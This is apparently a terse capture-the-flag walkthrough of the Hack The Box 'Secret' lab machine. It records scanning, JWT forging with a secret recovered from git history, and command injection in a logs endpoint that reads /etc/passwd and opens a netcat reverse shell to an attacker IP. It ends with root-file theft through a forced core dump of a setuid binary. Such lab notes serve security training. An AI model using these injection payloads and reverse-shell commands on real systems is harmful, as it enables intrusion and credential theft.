# scanning
* `TCP` Scan
TARGET=10.10.11.120 && nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

## 80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DUMB Docs

> dirsearch -u http://10.10.11.120 -e php,asp,aspx,jsp,js,html,txt,sql -w /usr/share/wordlists/dirb/common.txt -f
[11:08:03] 200 -   93B  - /api
[11:08:03] 200 -   93B  - /api/
[11:08:06] 301 -  179B  - /assets  ->  /assets/
[11:08:33] 200 -   20KB - /docs
[11:08:33] 200 -   20KB - /docs/
[11:08:34] 301 -  183B  - /download  ->  /download/


## 3000/tcp open  http    syn-ack ttl 63 Node.js (Express middleware)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: DUMB Docs

> dirsearch -u http://10.10.11.120:3000 -e php,asp,aspx,jsp,js,html,txt,sql -w /usr/share/wordlists/dirb/common.txt -f
[11:12:01] 200 -   93B  - /api/
[11:12:01] 200 -   93B  - /api
[11:12:03] 301 -  179B  - /assets  ->  /assets/
[11:12:31] 200 -   20KB - /docs
[11:12:31] 200 -   20KB - /docs/
[11:12:31] 301 -  183B  - /download  ->  /download/

root@dasith.works
dasith
theadmin:Kekc8swFgD6zU



{"email": "root@dasith.works","password": "Kekc8swFgD6zU"}
http://10.10.11.120:3000/api/user/login

{"name": "test", "email": "test@test.com","password": "test123"}

* download file.zip
.env
```
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
```

* register a user & login
> curl http://10.10.11.120/api/user/register -d '{"name": "test01", "email": "test01@dasith.works","password": "test123"}' -H "Content-Type: application/json"
> curl http://10.10.11.120/api/user/login -d '{"email": "test01@dasith.works","password": "test123"}' -H "Content-Type: application/json"

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWMyNWFjNTFmMDEyNTA0NjI4ODgwZWQiLCJuYW1lIjoidGVzdDAxIiwiZW1haWwiOiJ0ZXN0MDFAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQwMTI3MTc4fQ.YUnRCd7LnfqL_3tbUgRXWyrgnXypABs5RMq8CxzW1-8


> root@kali:~/workspace/htb-Secret/files/local-web# git diff HEAD~2
```
diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
diff --git a/node_modules/.bin/ejs b/node_modules/.bin/ejs
deleted file mode 100755
index 0feab0b..0000000
--- a/node_modules/.bin/ejs
+++ /dev/null
@@ -1,212 +0,0 @@
```

* regenerate jwt using the key
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWMyNWFjNTFmMDEyNTA0NjI4ODgwZWQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3QwMUBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDAxMjcxNzh9.fegnWdqT4Ql_ZEci2jD7i6AMgnQEIc-ASkmJa_8pPbg

> curl http://10.10.11.120/api/priv -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWMyNWFjNTFmMDEyNTA0NjI4ODgwZWQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3QwMUBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDAxMjcxNzh9.fegnWdqT4Ql_ZEci2jD7i6AMgnQEIc-ASkmJa_8pPbg"
```
{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}
```

* inspect local-web/routes/private.js
```js
router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})
```
## const getLogs = `git log --oneline ${file}`;

> curl -i \
  -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWMyNWFjNTFmMDEyNTA0NjI4ODgwZWQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3QwMUBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDAxMjcxNzh9.fegnWdqT4Ql_ZEci2jD7i6AMgnQEIc-ASkmJa_8pPbg' \
  'http://10.10.11.120/api/logs?file=index.js;id;cat+/etc/passwd' | sed 's/\\n/\n/g'
```
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
dasith:x:1000:1000:dasith:/home/dasith:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mongodb:x:113:117::/var/lib/mongodb:/usr/sbin/nologin
```

> curl -i   -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWMyNWFjNTFmMDEyNTA0NjI4ODgwZWQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3QwMUBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDAxMjcxNzh9.fegnWdqT4Ql_ZEci2jD7i6AMgnQEIc-ASkmJa_8pPbg'   'http://10.10.11.120/api/logs?file=index.js;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.x.x%204444%20%3E%2Ftmp%2Ff' | sed 's/\\n/\n/g'

dasith@secret:~$ ls -ls
ls -ls
total 8
4 drwxrwxr-x 8 dasith dasith 4096 Sep  8 20:00 local-web
4 -r-------- 1 dasith dasith   33 Dec 21 22:52 user.txt
dasith@secret:~$ cat user.txt	
cat user.txt

## user.txt

ssh dasith@10.10.11.120 -i ~/.ssh/id_rsa

# pe
> dasith@secret:/opt$ cat code.c 
```c++
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/limits.h>

void dircount(const char *path, char *summary)
{
    DIR *dir;
    char fullpath[PATH_MAX];
    struct dirent *ent;
    struct stat fstat;

    int tot = 0, regular_files = 0, directories = 0, symlinks = 0;

    if((dir = opendir(path)) == NULL)
    {
        printf("\nUnable to open directory.\n");
        exit(EXIT_FAILURE);
    }
    while ((ent = readdir(dir)) != NULL)
    {
        ++tot;
        strncpy(fullpath, path, PATH_MAX-NAME_MAX-1);
        strcat(fullpath, "/");
        strncat(fullpath, ent->d_name, strlen(ent->d_name));
        if (!lstat(fullpath, &fstat))
        {
            if(S_ISDIR(fstat.st_mode))
            {
                printf("d");
                ++directories;
            }
            else if(S_ISLNK(fstat.st_mode))
            {
                printf("l");
                ++symlinks;
            }
            else if(S_ISREG(fstat.st_mode))
            {
                printf("-");
                ++regular_files;
            }
            else printf("?");
            printf((fstat.st_mode & S_IRUSR) ? "r" : "-");
            printf((fstat.st_mode & S_IWUSR) ? "w" : "-");
            printf((fstat.st_mode & S_IXUSR) ? "x" : "-");
            printf((fstat.st_mode & S_IRGRP) ? "r" : "-");
            printf((fstat.st_mode & S_IWGRP) ? "w" : "-");
            printf((fstat.st_mode & S_IXGRP) ? "x" : "-");
            printf((fstat.st_mode & S_IROTH) ? "r" : "-");
            printf((fstat.st_mode & S_IWOTH) ? "w" : "-");
            printf((fstat.st_mode & S_IXOTH) ? "x" : "-");
        }
        else
        {
            printf("??????????");
        }
        printf ("\t%s\n", ent->d_name);
    }
    closedir(dir);

    snprintf(summary, 4096, "Total entries       = %d\nRegular files       = %d\nDirectories         = %d\nSymbolic links      = %d\n", tot, regular_files, directories, symlinks);
    printf("\n%s", summary);
}


void filecount(const char *path, char *summary)
{
    FILE *file;
    char ch;
    int characters, words, lines;

    file = fopen(path, "r");

    if (file == NULL)
    {
        printf("\nUnable to open file.\n");
        printf("Please check if file exists and you have read privilege.\n");
        exit(EXIT_FAILURE);
    }

    characters = words = lines = 0;
    while ((ch = fgetc(file)) != EOF)
    {
        characters++;
        if (ch == '\n' || ch == '\0')
            lines++;
        if (ch == ' ' || ch == '\t' || ch == '\n' || ch == '\0')
            words++;
    }

    if (characters > 0)
    {
        words++;
        lines++;
    }

    snprintf(summary, 256, "Total characters = %d\nTotal words      = %d\nTotal lines      = %d\n", characters, words, lines);
    printf("\n%s", summary);
}


int main()
{
    char path[100];
    int res;
    struct stat path_s;
    char summary[4096];

    printf("Enter source file/directory name: ");
    scanf("%99s", path);
    getchar();
    stat(path, &path_s);
    if(S_ISDIR(path_s.st_mode))
        dircount(path, summary);
    else
        filecount(path, summary);

    // drop privs to limit file write
    setuid(getuid());
    // Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);
    printf("Save results a file? [y/N]: ");
    res = getchar();
    if (res == 121 || res == 89) {
        printf("Path: ");
        scanf("%99s", path);
        FILE *fp = fopen(path, "a");
        if (fp != NULL) {
            fputs(summary, fp);
            fclose(fp);
        } else {
            printf("Could not open %s for writing\n", path);
        }
    }

    return 0;
}
```

```
dasith@secret:/opt$ ./count
Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: ^Z
[1]+  Stopped                 ./count
dasith@secret:/opt$ ps
    PID TTY          TIME CMD
   1445 pts/1    00:00:00 bash
   1479 pts/1    00:00:00 count
   1575 pts/1    00:00:00 ps
dasith@secret:/opt$ kill -BUS 1479
dasith@secret:/opt$ fg
./count
Bus error (core dumped)
dasith@secret:/opt$ 
```

> apport-unpack _opt_count.1000.crash /tmp/crash-report

> strings /tmp/crash-report/CoreDump 

# root

# ref
https://drt.sh/posts/htb-secret/
